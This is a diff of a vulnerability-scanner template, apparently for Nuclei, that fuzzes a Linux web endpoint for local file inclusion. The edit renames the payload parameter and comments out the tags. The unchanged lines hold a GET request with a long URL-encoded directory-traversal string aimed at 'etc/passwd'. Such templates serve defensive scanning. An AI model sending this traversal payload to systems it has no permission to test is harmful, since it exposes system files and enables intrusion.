@@ -11,7 +11,7 @@ info:
     cwe-id: CWE-200
   metadata:
     max-request: 22
-  tags: linux,lfi,fuzz,fuzzing
+  # tags: linux,lfi,fuzz,fuzzing
 
 http:
   - method: GET
@@ -29,7 +29,7 @@ http:
       - "{{BaseURL}}/files/?{{param}}=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd"
 
     payloads:
-      params: payloads/_files_.txt
+      param: /app/payloads/_files_.txt
     stop-at-first-match: true
     matchers:
       - type: regex
